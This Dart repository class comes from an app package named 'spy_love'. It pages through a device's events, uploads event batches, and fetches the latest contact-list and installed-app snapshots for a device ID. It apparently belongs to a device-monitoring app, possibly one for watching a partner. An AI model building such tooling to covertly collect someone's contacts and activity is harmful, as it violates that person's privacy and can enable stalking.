import 'package:spy_love/core/constants/api_constants.dart';
import 'package:spy_love/core/network/api_service.dart';
import 'package:spy_love/core/network/http_method.dart';
import 'package:spy_love/core/types/either.dart';
import 'package:spy_love/features/devices/models/device_event_model.dart';

class EventRepository {
  EventRepository(this._api);

  final ApiService _api;

  Future<Either<List<DeviceEventModel>, String>> listEvents({
    required String deviceId,
    String? eventPrefix,
    int page = 1,
    int pageSize = 20,
    bool loader = true,
  }) async {
    final query = <String, dynamic>{
      'device_id': deviceId,
      'page': page,
      'page_size': pageSize,
    };
    if (eventPrefix != null && eventPrefix.isNotEmpty) {
      query['event_prefix'] = eventPrefix;
    }

    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.events,
      method: HttpMethod.get,
      queryParameters: query,
      loader: loader,
    );

    if (result.isLeft) {
      final data = result.left;
      final results = data['results'] as List<dynamic>? ?? const [];
      final events = results
          .map((e) => DeviceEventModel.fromJson(e as Map<String, dynamic>))
          .toList();
      return Left(events);
    }
    return Right(result.right);
  }

  Future<Either<List<DeviceEventModel>, String>> listAllEvents({
    required String deviceId,
    String? eventPrefix,
    int maxPages = 5,
    int pageSize = 100,

    /// Background / poll fetches must keep this false so the global overlay
    /// does not block the UI every few seconds.
    bool loader = false,
  }) async {
    final all = <DeviceEventModel>[];
    for (var page = 1; page <= maxPages; page++) {
      final result = await listEvents(
        deviceId: deviceId,
        eventPrefix: eventPrefix,
        page: page,
        pageSize: pageSize,
        loader: loader && page == 1,
      );
      if (result.isRight) return Right(result.right);

      final batch = result.left;
      all.addAll(batch);
      if (batch.length < pageSize) break;
    }
    return Left(all);
  }

  /// Returns the ingest payload on success (may include `paused` / `paused_until`).
  Future<Either<Map<String, dynamic>, String>> uploadBatch({
    required String deviceId,
    required List<Map<String, dynamic>> events,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsBatch,
      method: HttpMethod.post,
      body: {'device_id': deviceId, 'events': events},
      loader: false,
      resultOverlay: false,
    );

    if (result.isLeft) return Left(result.left);
    return Right(result.right);
  }

  /// Latest address-book snapshot for a device via GET /events/contacts/latest/.
  /// Returns the raw snapshot map ({contacts, contact_count, ...}) on success,
  /// or null when none exists yet (404) / on error.
  Future<Map<String, dynamic>?> latestContacts({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsContactsLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? result.left : null;
  }

  /// Latest installed-app inventory for a device via
  /// GET /events/app-inventory/latest/. Returns the raw snapshot map
  /// ({apps, app_count, include_system, ...}) or null when none/on error.
  Future<Map<String, dynamic>?> latestAppInventory({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsAppInventoryLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? result.left : null;
  }
}
